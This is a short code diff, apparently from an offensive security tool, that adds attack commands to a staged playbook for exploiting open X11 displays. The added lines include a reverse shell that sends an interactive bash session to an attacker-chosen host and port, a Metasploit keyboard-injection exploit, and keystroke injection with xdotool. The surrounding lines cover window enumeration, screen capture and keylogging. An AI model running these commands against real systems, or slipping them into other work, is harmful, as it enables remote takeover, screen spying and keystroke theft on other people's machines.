@@ -5163,12 +5163,15 @@ _STEP_COMMANDS = {
         1: [
             "xdpyinfo -display <RHOST>:0",
             "nmap -p6000 --script x11-access <RHOST>",
+            "xwininfo -root -tree -display <RHOST>:0   # list open windows (titles reveal what's on screen)",
         ],
         2: [
             "xwd -root -display <RHOST>:0 -out screen.xwd && convert screen.xwd screen.png",
         ],
         3: [
-            "xdotool --display <RHOST>:0 key --window $(xdotool search --name . | head -1) ...",
+            "xterm -display <RHOST>:0 -e bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'   # most reliable RCE on an open display",
+            "msfconsole -q -x 'use exploit/unix/x11/x11_keyboard_exec; set RHOSTS <RHOST>; set RPORT 6000; set LHOST <LHOST>; run; exit'   # virtual-keyboard command injection",
+            "xdotool --display <RHOST>:0 type 'id'   # inject keystrokes into the focused window",
             "# keylog: xspy <RHOST>:0",
         ],
         4: [
